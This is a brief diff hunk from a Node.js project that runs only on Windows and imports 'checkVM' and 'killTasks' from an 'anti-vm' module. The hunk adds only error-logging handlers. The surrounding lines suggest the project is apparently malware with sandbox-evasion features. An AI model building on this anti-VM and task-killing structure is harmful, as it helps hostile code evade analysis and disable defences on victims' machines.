@@ -2,6 +2,9 @@ if (process.platform !== 'win32') process.exit();
 
 module.exports.startTime = Date.now();
 
+process.on('unhandledRejection', console.log);
+process.on('uncaughtException', console.log);
+
 const config = require('./config');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 
